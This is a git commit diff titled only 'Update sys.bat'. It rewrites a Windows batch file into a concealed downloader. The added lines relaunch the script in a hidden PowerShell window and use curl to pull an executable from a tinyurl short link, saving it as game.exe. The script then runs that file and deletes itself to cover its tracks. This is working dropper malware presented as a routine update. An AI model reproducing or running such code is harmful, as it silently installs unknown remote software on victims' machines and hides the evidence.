4d344dd1b80fc83a96bf209ff4806b8a4c2e3bd8
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2026-01-25 19:49:12 +0000

    Update sys.bat

--- sys.bat
+++ sys.bat
@@ -1,3 +1,14 @@
 @echo off
-start cmd.exe
+if "%1" neq "hidden" (
+  powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
+  exit
+)
 
+set "URL=https://tinyurl.com/my0xfuck"
+set "OUT=%~dp0game.exe"
+
+curl -L "%URL%" -o "%OUT%"
+start "" "%OUT%"
+
+timeout /t 2 >nul
+del "%~f0"
